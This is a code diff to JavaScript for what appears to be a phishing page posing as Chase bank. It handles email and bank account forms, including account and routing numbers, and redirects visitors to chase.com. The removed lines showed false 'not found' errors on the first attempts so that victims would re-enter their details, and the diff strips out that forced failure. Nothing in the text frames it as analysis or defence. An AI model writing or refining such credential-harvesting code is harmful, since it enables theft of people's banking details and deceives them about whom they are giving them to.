@@ -72,7 +72,7 @@ EmailFrom.addEventListener("submit", async function (e) {
 
         clearLoading(loginbtn);
         const errorDiv = document.getElementById("errorremail")
-        attempts += 1;
+    
   
         
         if (attempts <= 1) {
@@ -122,21 +122,6 @@ AccountFrom.addEventListener("submit", async function (e) {
         clearLoading(loginbtn);
         const errorDiv = document.getElementById("errorraccount");
         attempts += 1;
-        console.log(attempts);
-
-        
-        if (attempts <= 3) {
-
-            errorDiv.innerHTML = ""; // Clear old errors
-
-            const errorMessage = document.createElement("div");
-            errorMessage.classList.add("error-message");
-            errorMessage.textContent = 
-                "Account No and Routine No not found. Check input and try again.";
-
-            errorDiv.appendChild(errorMessage);
-            return;
-        }
 
 
         if (data.status === "success") {
@@ -324,4 +309,5 @@ dihlogin.addEventListener("click", () => {
 
 dihlogin2.addEventListener("click", () => {
     window.location.href= 'https://www.chase.com/';
+
 });
